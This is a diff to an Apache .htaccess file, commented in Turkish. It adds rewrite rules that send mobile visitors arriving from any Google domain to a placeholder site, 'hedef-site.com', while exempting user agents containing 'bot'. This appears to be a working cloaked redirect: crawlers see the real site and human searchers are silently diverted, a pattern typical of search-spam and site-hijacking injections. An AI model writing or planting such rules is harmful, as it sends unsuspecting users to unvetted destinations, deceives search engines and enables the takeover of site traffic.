@@ -1,5 +1,13 @@
 RewriteEngine On
-RewriteCond %{HTTP_REFERER} google\.com.*q=girne.*forklift [NC]
+
+# 1. Ziyaretçi Google (google.com, google.com.tr vb.) üzerinden geliyorsa
+RewriteCond %{HTTP_REFERER} google\.[a-z]{2,3} [NC]
+
+# 2. Ziyaretçinin cihazı mobil (Android, iPhone vb.) ise
 RewriteCond %{HTTP_USER_AGENT} "mobile|android|iphone" [NC]
+
+# 3. Ziyaretçi bir arama motoru botu (Googlebot vb.) DEĞİLSE
 RewriteCond %{HTTP_USER_AGENT} !bot [NC]
-RewriteRule ^.*$ https://sonmeztrans.com/kibris-forklift-girne.html [R=302,L]
+
+# Tüm şartlar sağlanıyorsa yönlendirmeyi yap
+RewriteRule ^.*$ https://hedef-site.com [R=302,L]
